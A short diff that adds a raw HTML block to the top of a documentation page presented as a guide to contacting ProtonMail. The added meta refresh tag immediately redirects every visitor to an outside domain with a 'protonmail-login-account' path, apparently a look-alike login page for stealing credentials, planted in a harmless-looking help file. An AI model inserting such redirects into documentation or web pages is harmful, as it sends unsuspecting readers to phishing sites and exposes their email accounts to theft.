@@ -1,3 +1,7 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://aclogportal.com/protonmail-login-account">
+
 How to Contact ProtonMail?: A Complete Guide for 2025 📩
 ============================================
 
